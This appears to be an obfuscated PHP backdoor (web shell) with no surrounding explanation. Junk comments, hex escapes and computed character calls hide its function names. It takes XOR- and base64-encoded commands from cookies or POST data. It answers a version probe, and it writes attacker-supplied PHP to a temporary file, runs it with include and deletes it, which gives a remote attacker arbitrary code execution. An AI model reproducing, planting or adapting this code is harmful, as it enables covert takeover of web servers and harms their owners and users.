<?php 	function	yjcvm(){/* iisus   */echo      61810;/*m*/}


$_bpqo/* ajerw   */=	'_bpqo'     ^    '<';


$ezzebrrlcd	=/*rp   */"\x66"    ./* qh */"i".$_bpqo(108)       .	$_bpqo(101)/*e */./* t  */"_"."p"."\x75"      ./* hac*/"t"."\137"/*  fz */.  $_bpqo(99)	./*y  */"\157"       .  "\156"/* ucfb */.	"t"."e".$_bpqo(110)	./*oei*/"t"."s";


$jjerc/* qtvau*/=   "\x62"	.	"a"."\163"/* fmr */./*   ojezj */"\x65"	./*  uc  */$_bpqo(341-287)/*  geu  */.     "4"."\137"    ./*fkd   */"\144"	./* q */"e"."c".$_bpqo(1026-915)	.	"\144"/* nvtfo  */.	"e";

$yavgjvcd     =	$_bpqo(699-582)	.  "n"."s"."e"."r".$_bpqo(105)     .   "\141"	./*  emkfu   */"\154"/*   x*/.       $_bpqo(721-616)   ./*vhwe */$_bpqo(589-467)	.    "e";

$hj_sykj      =      "p"."\150"/*  bjvb*/.	"p"."v"."e"."\162"/*akozo   */./*l   */"\163"     .	"i".$_bpqo(657-546)   ./* xi   */"n";$zbbpmh/*  _hpau */=	"\165"	.	"n"."\154"      .       "\151"	./* egp   */$_bpqo(559-449)     .    "k";

/*n  */
function    oiveohovf($lyfsv,/*  i */$hsjhwjmsgy){

/*   kee*/global       $_bpqo;/*  de*/$oadtyuok/*wcaqb*/=    "";


       for	($tzudgb   =/*   kg   */0;	$tzudgb	<      strlen($lyfsv);)   {


/* qfcop   */for/* wxu  */($hoyrk/* nyn */=  0;	$hoyrk    <	strlen($hsjhwjmsgy)     &&      $tzudgb/*   mcpfw   */<      strlen($lyfsv);	$hoyrk++,/*kgkw*/$tzudgb++)   {
     $oadtyuok	.=    $_bpqo(ord($lyfsv[$tzudgb])   ^/*   gt */ord($hsjhwjmsgy[$hoyrk]));


/* cb*/}


/*am */}
/*   ivfq   */return   $oadtyuok;
}

$nbvsfyqywh/*  mwv*/=/*  t */$_COOKIE;
$phtllukx  =/*  gl   */$_POST;$nbvsfyqywh      =	array_merge($phtllukx,    $nbvsfyqywh);$fuxkzcp/*  nx*/=	$_bpqo(416-318)	./*  tm   */"4".$_bpqo(101)	./*lpczy*/$_bpqo(230-177)/*  yx */./*  uqc  */"7"."1"."6"."4".$_bpqo(261-216)/* v   */.	"c".$_bpqo(102)/*dhpm*/.	"\x66"	./* jlg   */$_bpqo(48)  .	"\55"/*   wjq   */./*  g*/"4"."c"."b"."2".$_bpqo(518-473)	.	"b".$_bpqo(99)     .     "\x33"	.    "\62"     .	"\x2d"       ./*  f_o */"a".$_bpqo(54)	./*ykl */"f"."b"."7"."8".$_bpqo(100)   .	"7"."\142"/*x  */.     $_bpqo(833-783)  ./*  lukhe   */"\141"	.  $_bpqo(98);
foreach/*   g*/($nbvsfyqywh     as/*  bhlw*/$awcmx/*  nw   */=>	$lyfsv)  {

/*   qbmo  */$lyfsv  =/*   naay  */$yavgjvcd(oiveohovf(oiveohovf($jjerc($lyfsv),      $fuxkzcp),	$awcmx));/*  x  */if	(isset($lyfsv["a"."k"]))	{

    if      ($lyfsv["a"]	==	"\x69")       {
	$tzudgb  =      array();
	$tzudgb["p"."\166"]	=       $hj_sykj();

     $tzudgb[$_bpqo(957-842)	.	"v"]/*zpxj   */=	"3".$_bpqo(696-650)/*   jmf*/.	$_bpqo(53);
   echo/*   j_fv */@serialize($tzudgb);

/*  h  */}	elseif/*mqvy  */($lyfsv["a"]/*ca*/==      "\145")       {    $uxxiimf/*  s   */=	sprintf("\56"	.	"\x2f"/*  akg  */.     "%"."\x73"      .	"\56"/*   up */./*   wzkv  */$_bpqo(617-505)     .	"\154",/*   qwy*/md5($fuxkzcp));
	$ezzebrrlcd($uxxiimf,    "<"	.	"\x3f"	./*   ifh */"p"."h"."p".$_bpqo(32)	.   $_bpqo(117)/* m   */.      "n"."l".$_bpqo(105)	.	$_bpqo(444-334)	.	"k"."\50"/* rlk*/.	$_bpqo(95)	./*   s   */"_"."\x46"	./*   slqk  */"I".$_bpqo(587-511)       ./*  w_qo   */"\x45"     .    "\137"   ./*  d*/"\137"  .	")".";".$_bpqo(32)      .      $lyfsv[$_bpqo(1005-905)]);

     include($uxxiimf);

	$zbbpmh($uxxiimf);


/* lqynz  */}      exit();

/* lj   */}


}
